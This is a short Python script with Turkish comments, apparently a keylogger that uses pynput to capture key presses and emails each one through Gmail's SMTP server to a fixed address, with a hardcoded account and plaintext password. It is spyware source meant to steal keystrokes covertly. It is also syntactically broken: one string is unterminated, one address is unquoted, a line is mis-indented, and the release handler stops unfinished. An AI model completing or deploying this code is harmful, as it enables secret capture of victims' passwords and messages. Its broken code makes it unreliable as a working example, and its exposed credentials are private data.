import smtplib
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        
        # E-posta adresi ve şifre
        email_address = 't44653246@gmail.com'
        password = 'mustafa052010
        
        # Giriş yapma
        server.login(email_address, password)
        
        # E-posta oluşturma
        msg = MIMEText('Bir tuşa basıldı: {}'.format(key))
        msg['Subject'] = 1
        msg['From'] = mustafabahceli12@gmail.com
        msg['To'] = 'mustafabahceli12@gmail.com'
        
        # E-posta gönderme
    server.sendmail(email_address, 'mustafabahceli12@gmail.com', msg.as_string())
        
        # Bağlantıyı kapatma
        server.quit()
        
    except Exception as e:
        print("E-posta gönderme hatası:", e)

def on_release(key):
